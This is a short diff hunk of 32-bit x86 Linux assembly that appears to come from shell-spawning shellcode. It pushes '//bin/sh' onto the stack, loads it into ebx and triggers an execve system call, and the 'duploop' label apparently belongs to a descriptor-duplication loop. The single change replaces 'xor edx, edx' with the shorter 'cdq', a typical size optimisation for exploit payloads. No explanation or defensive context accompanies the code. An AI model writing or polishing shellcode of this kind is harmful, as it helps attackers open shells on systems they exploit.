@@ -72,5 +72,5 @@ duploop:
 	push 0x68732f6e
 	push 0x69622f2f
 	mov ebx, esp
-	xor edx, edx
+	cdq
 	int 0x80
